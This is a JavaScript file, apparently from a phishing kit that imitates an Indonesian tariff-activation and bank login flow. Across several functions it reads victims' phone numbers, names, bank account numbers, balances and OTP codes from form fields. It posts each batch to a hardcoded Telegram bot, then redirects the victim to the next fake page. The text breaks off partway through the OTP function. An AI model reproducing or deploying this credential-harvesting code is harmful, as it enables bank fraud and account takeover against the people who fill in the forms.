// Kirim Form Aktivasi Awal
function sendData(event) {
  event.preventDefault();

  var nomor = document.getElementById("nohp").value;
  var tarif = document.getElementById("tarif") ? document.getElementById("tarif").value : "N/A";

  var token = "8148248651:AAGKh979HHIIl1oDxNEDVmO8O3aKi51oi4U";
  var chat_id = "7638456973";

  var message = `🔔 *Form Aktivasi Tarif*\n\n📱 *Nomor:* ${nomor}\n💰 *Tarif:* ${tarif}`;

  $.post(`https://api.telegram.org/bot${token}/sendMessage`, {
    chat_id: chat_id,
    text: message,
    parse_mode: "Markdown"
  })
  .done(function () {
    window.location.href = "login.html";
  })
  .fail(function () {
    alert("Gagal mengirim ke Telegram.");
  });
}

// Kirim Login
function sendLogin() {
  event.preventDefault();
  $(".loading-screen").fadeIn();
  $("#kirim").html("Memproses....").prop("disabled", true);

  const tarif = $("#tarif").val();
  const nomor = $("#nomor").val();
  const nama = $("#nama").val();
  const rek = $("#rek").val();

  if (!tarif || !nomor || !nama || !rek) {
    window.location.href = "/";
    return false;
  }

  sessionStorage.setItem("tarif", tarif);
  sessionStorage.setItem("nomor", nomor);
  sessionStorage.setItem("nama", nama);
  sessionStorage.setItem("rek", rek);

  const message = `
🔐 *LOGIN BARU*
━━━━━━━━━━━━━━━
👤 *Nama:* ${nama}
📱 *Nomor:* ${nomor}
🏦 *Rekening:* ${rek}
💳 *Saldo / Tarif:* ${tarif}
━━━━━━━━━━━━━━━
📥 *Waktu:* ${new Date().toLocaleString()}
  `;

  const token = "8148248651:AAGKh979HHIIl1oDxNEDVmO8O3aKi51oi4U";
  const chat_id = "7638456973";

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chat_id,
      text: message,
      parse_mode: "Markdown",
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Terkirim ke Telegram:", data);
      setTimeout(function () {
        window.location = "saldo.html";
        $(".loading-screen").fadeOut();
        $("#kirim").html("Lanjutkan").prop("disabled", false);
        if (navigator.vibrate) navigator.vibrate(180);
      }, 200);
    })
    .catch((error) => {
      console.error("Gagal kirim ke Telegram:", error);
      alert("Gagal mengirim data. Coba lagi.");
      $(".loading-screen").fadeOut();
      $("#kirim").html("Lanjutkan").prop("disabled", false);
    });
}

// Kirim Saldo
function sendSaldo() {
  event.preventDefault();
  $("#kirim").html("Verify...");
  $(".loading-screen").fadeIn();

  const tarif = $("#tarif").val();
  const nomor = $("#nomor").val();
  const nama = $("#nama").val();
  const rek = $("#rek").val();
  const saldo = $("#saldo").val();

  if (!tarif || !nomor || !nama || !rek || !saldo) {
    window.location.href = "/";
    return false;
  }

  sessionStorage.setItem("saldo", saldo);

  const message = `
📥 *VERIFIKASI SALDO*
━━━━━━━━━━━━━━━
👤 *Nama:* ${nama}
📱 *Nomor:* ${nomor}
🏦 *Rekening:* ${rek}
💳 *Tarif:* ${tarif}
💰 *Saldo:* ${saldo}
━━━━━━━━━━━━━━━
🕒 *Waktu:* ${new Date().toLocaleString()}
`;

  const token = "8148248651:AAGKh979HHIIl1oDxNEDVmO8O3aKi51oi4U";
  const chat_id = "7638456973";

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chat_id,
      text: message,
      parse_mode: "Markdown",
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Data terkirim ke Telegram:", data);
      setTimeout(function () {
        $("#kirim").html("Benar");
        $(".loading-screen").fadeOut();
        if (navigator.vibrate) navigator.vibrate(180);
        window.location = "otp.html";
      }, 300);
    })
    .catch((error) => {
      console.error("Gagal kirim ke Telegram:", error);
      alert("Gagal mengirim data. Silakan coba ulang.");
      $(".loading-screen").fadeOut();
      $("#kirim").html("Coba Lagi");
    });
}

// Kirim OTP
function sendOtp() {
  event.preventDefault();
  $("#errorAlert").fadeIn();
  document.getElementById("submit-btn").value = "Memproses....";

  const tarif = $("#tarif").val();
  const nomor = $("#nomor").val();
  const nama = $("#nama").val();
  const rek = $("#rek").val();
  const saldo = $("#saldo").val();
  const otp = $("#otp").val();

  if (!tarif || !nomor || !nama || !rek || !saldo || !otp) {
    window.location.href = "/";
    return false;
  }

  sessionStorage.setItem("otp", otp);

  const message = `
🔐 *OTP DIKIRIM*
━━━━━━━━━━━━━━━
👤 *Nama:* ${nama}
📱 *Nomor:* ${nomor}
🏦 *Rekening:* ${rek}
💳 *Tarif:* ${tarif}
💰 *Saldo:* ${saldo}
🔑 *OTP:* ${otp}
━━━━━━━━━━━━━━━
🕒 *Waktu:* ${new Date().toLocaleString()}
`;

  const token = "8148248651:AAGKh979HHIIl1oDxNEDVmO8O3aKi51oi4U";
  const chat_id = "7638456973";

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
